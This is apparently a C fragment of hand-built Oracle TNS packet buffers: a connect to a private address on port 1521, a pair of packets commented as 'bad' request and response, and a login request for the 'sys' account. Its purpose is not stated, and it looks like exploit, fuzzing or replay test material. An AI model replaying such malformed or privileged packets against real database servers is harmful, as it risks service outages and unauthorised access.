unsigned char buf1[] = { //connect
	0x01, 0x08, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
	0x01, 0x39, 0x01, 0x2c, 0x00, 0x00, 0x08, 0x00, 
	0x7f, 0xff, 0xc6, 0x0e, 0x00, 0x00, 0x01, 0x00, 
	0x00, 0xce, 0x00, 0x3a, 0x00, 0x00, 0x02, 0x00, 
	0x41, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x28, 0x44, 0x45, 0x53, 0x43, 0x52, 
	0x49, 0x50, 0x54, 0x49, 0x4f, 0x4e, 0x3d, 0x28, 
	0x41, 0x44, 0x44, 0x52, 0x45, 0x53, 0x53, 0x3d, 
	0x28, 0x50, 0x52, 0x4f, 0x54, 0x4f, 0x43, 0x4f, 
	0x4c, 0x3d, 0x74, 0x63, 0x70, 0x29, 0x28, 0x48, 
	0x4f, 0x53, 0x54, 0x3d, 0x31, 0x39, 0x32, 0x2e, 
	0x31, 0x36, 0x38, 0x2e, 0x38, 0x2e, 0x35, 0x32, 
	0x29, 0x28, 0x50, 0x4f, 0x52, 0x54, 0x3d, 0x31, 
	0x35, 0x32, 0x31, 0x29, 0x29, 0x28, 0x43, 0x4f, 
	0x4e, 0x4e, 0x45, 0x43, 0x54, 0x5f, 0x44, 0x41, 
	0x54, 0x41, 0x3d, 0x28, 0x53, 0x45, 0x52, 0x56, 
	0x49, 0x43, 0x45, 0x5f, 0x4e, 0x41, 0x4d, 0x45, 
	0x3d, 0x6f, 0x61, 0x73, 0x69, 0x73, 0x44, 0x42, 
	0x31, 0x32, 0x63, 0x29, 0x28, 0x43, 0x49, 0x44, 
	0x3d, 0x28, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 
	0x4d, 0x3d, 0x45, 0x3a, 0x5c, 0x3f, 0x3f, 0x3f, 
	0x3f, 0x5c, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 
	0x5c, 0x4f, 0x72, 0x61, 0x63, 0x6c, 0x65, 0x3f, 
	0x3f, 0x3f, 0x3f, 0x5c, 0x3f, 0x3f, 0x3f, 0x3f, 
	0x3f, 0x3f, 0x5c, 0x77, 0x69, 0x6e, 0x64, 0x6f, 
	0x77, 0x73, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 
	0x5c, 0x31, 0x30, 0x5c, 0x73, 0x71, 0x6c, 0x70, 
	0x6c, 0x75, 0x73, 0x2e, 0x65, 0x78, 0x65, 0x29, 
	0x28, 0x48, 0x4f, 0x53, 0x54, 0x3d, 0x44, 0x44, 
	0x44, 0x29, 0x28, 0x55, 0x53, 0x45, 0x52, 0x3d, 
	0x64, 0x65, 0x6c, 0x6c, 0x29, 0x29, 0x29, 0x29 
};
unsigned char buf2[] = { //resend
	0x00, 0x08, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00 
};
unsigned char buf3[] = { //connect
	0x01, 0x08, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
	0x01, 0x39, 0x01, 0x2c, 0x00, 0x00, 0x08, 0x00, 
	0x7f, 0xff, 0xc6, 0x0e, 0x00, 0x00, 0x01, 0x00, 
	0x00, 0xce, 0x00, 0x3a, 0x00, 0x00, 0x02, 0x00, 
	0x41, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x28, 0x44, 0x45, 0x53, 0x43, 0x52, 
	0x49, 0x50, 0x54, 0x49, 0x4f, 0x4e, 0x3d, 0x28, 
	0x41, 0x44, 0x44, 0x52, 0x45, 0x53, 0x53, 0x3d, 
	0x28, 0x50, 0x52, 0x4f, 0x54, 0x4f, 0x43, 0x4f, 
	0x4c, 0x3d, 0x74, 0x63, 0x70, 0x29, 0x28, 0x48, 
	0x4f, 0x53, 0x54, 0x3d, 0x31, 0x39, 0x32, 0x2e, 
	0x31, 0x36, 0x38, 0x2e, 0x38, 0x2e, 0x35, 0x32, 
	0x29, 0x28, 0x50, 0x4f, 0x52, 0x54, 0x3d, 0x31, 
	0x35, 0x32, 0x31, 0x29, 0x29, 0x28, 0x43, 0x4f, 
	0x4e, 0x4e, 0x45, 0x43, 0x54, 0x5f, 0x44, 0x41, 
	0x54, 0x41, 0x3d, 0x28, 0x53, 0x45, 0x52, 0x56, 
	0x49, 0x43, 0x45, 0x5f, 0x4e, 0x41, 0x4d, 0x45, 
	0x3d, 0x6f, 0x61, 0x73, 0x69, 0x73, 0x44, 0x42, 
	0x31, 0x32, 0x63, 0x29, 0x28, 0x43, 0x49, 0x44, 
	0x3d, 0x28, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 
	0x4d, 0x3d, 0x45, 0x3a, 0x5c, 0x3f, 0x3f, 0x3f, 
	0x3f, 0x5c, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 
	0x5c, 0x4f, 0x72, 0x61, 0x63, 0x6c, 0x65, 0x3f, 
	0x3f, 0x3f, 0x3f, 0x5c, 0x3f, 0x3f, 0x3f, 0x3f, 
	0x3f, 0x3f, 0x5c, 0x77, 0x69, 0x6e, 0x64, 0x6f, 
	0x77, 0x73, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 
	0x5c, 0x31, 0x30, 0x5c, 0x73, 0x71, 0x6c, 0x70, 
	0x6c, 0x75, 0x73, 0x2e, 0x65, 0x78, 0x65, 0x29, 
	0x28, 0x48, 0x4f, 0x53, 0x54, 0x3d, 0x44, 0x44, 
	0x44, 0x29, 0x28, 0x55, 0x53, 0x45, 0x52, 0x3d, 
	0x64, 0x65, 0x6c, 0x6c, 0x29, 0x29, 0x29, 0x29 
};
unsigned char buf4[] = { //accept
	0x00, 0x20, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
	0x01, 0x39, 0x00, 0x01, 0x08, 0x00, 0x7f, 0xff, 
	0x01, 0x00, 0x00, 0x00, 0x00, 0x20, 0x41, 0x41, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
};
unsigned char buf5[] = { //data - bad - request
	0x00, 0x9c, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0xde, 0xad, 0xbe, 0xef, 0x00, 0x92, 
	0x0a, 0x20, 0x04, 0x00, 0x00, 0x04, 0x00, 0x00, 
	0x04, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x04, 0x00, 0x05, 0x0a, 0x20, 0x04, 0x00, 0x00, 
	0x08, 0x00, 0x01, 0x00, 0x01, 0xc6, 0x9c, 0x0e, 
	0xf9, 0xd2, 0x14, 0x00, 0x12, 0x00, 0x01, 0xde, 
	0xad, 0xbe, 0xef, 0x00, 0x03, 0x00, 0x00, 0x00, 
	0x04, 0x00, 0x04, 0x00, 0x01, 0x00, 0x01, 0x00, 
	0x02, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x04, 0x00, 0x05, 0x0a, 0x20, 0x04, 
	0x00, 0x00, 0x02, 0x00, 0x03, 0xe0, 0xe1, 0x00, 
	0x02, 0x00, 0x06, 0xfc, 0xff, 0x00, 0x02, 0x00, 
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 
	0x05, 0x0a, 0x20, 0x04, 0x00, 0x00, 0x0c, 0x00, 
	0x01, 0x00, 0x11, 0x06, 0x10, 0x0c, 0x0f, 0x0a, 
	0x0b, 0x08, 0x02, 0x01, 0x03, 0x00, 0x03, 0x00, 
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 
	0x05, 0x0a, 0x20, 0x04, 0x00, 0x00, 0x03, 0x00, 
	0x01, 0x00, 0x03, 0x01 
};
unsigned char buf6[] = { //data - bad - response
	0x00, 0x7f, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0xde, 0xad, 0xbe, 0xef, 0x00, 0x75, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 
	0x04, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x04, 0x00, 0x05, 0x0c, 0x10, 0x02, 0x00, 0x00, 
	0x02, 0x00, 0x06, 0x00, 0x1f, 0x00, 0x0e, 0x00, 
	0x01, 0xde, 0xad, 0xbe, 0xef, 0x00, 0x03, 0x00, 
	0x00, 0x00, 0x02, 0x00, 0x04, 0x00, 0x01, 0x00, 
	0x01, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x04, 0x00, 0x05, 0x0c, 0x10, 0x02, 0x00, 0x00, 
	0x02, 0x00, 0x06, 0xfb, 0xff, 0x00, 0x02, 0x00, 
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 
	0x05, 0x0c, 0x10, 0x02, 0x00, 0x00, 0x01, 0x00, 
	0x02, 0x00, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x04, 0x00, 0x05, 0x0c, 0x10, 
	0x02, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00 
};
unsigned char buf7[] = {//sys - request
	0x00, 0xc5, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x03, 0x76, 0x02, 0x01, 0x03, 0x00, 
	0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x01, 0x05, 
	0x00, 0x00, 0x00, 0x01, 0x01, 0x03, 0x73, 0x79, 
	0x73, 0x0d, 0x00, 0x00, 0x00, 0x0d, 0x41, 0x55, 
	0x54, 0x48, 0x5f, 0x54, 0x45, 0x52, 0x4d, 0x49, 
	0x4e, 0x41, 0x4c, 0x03, 0x00, 0x00, 0x00, 0x03, 
	0x44, 0x44, 0x44, 0x00, 0x00, 0x00, 0x00, 0x0f, 
	0x00, 0x00, 0x00, 0x0f, 0x41, 0x55, 0x54, 0x48, 
	0x5f, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d, 
	0x5f, 0x4e, 0x4d, 0x0b, 0x00, 0x00, 0x00, 0x0b, 
	0x6e, 0x61, 0x76, 0x69, 0x63, 0x61, 0x74, 0x2e, 
	0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x0c, 
	0x00, 0x00, 0x00, 0x0c, 0x41, 0x55, 0x54, 0x48, 
	0x5f, 0x4d, 0x41, 0x43, 0x48, 0x49, 0x4e, 0x45, 
	0x07, 0x00, 0x00, 0x00, 0x07, 0x44, 0x53, 0x50, 
	0x5c, 0x44, 0x44, 0x44, 0x00, 0x00, 0x00, 0x00, 
	0x08, 0x00, 0x00, 0x00, 0x08, 0x41, 0x55, 0x54, 
	0x48, 0x5f, 0x50, 0x49, 0x44, 0x0d, 0x00, 0x00, 
	0x00, 0x0d, 0x31, 0x32, 0x35, 0x31, 0x38, 0x30, 
	0x3a, 0x31, 0x32, 0x36, 0x32, 0x38, 0x30, 0x00, 
	0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x08, 
	0x41, 0x55, 0x54, 0x48, 0x5f, 0x53, 0x49, 0x44, 
	0x04, 0x00, 0x00, 0x00, 0x04, 0x64, 0x65, 0x6c, 
	0x6c, 0x00, 0x00, 0x00, 0x00 
};
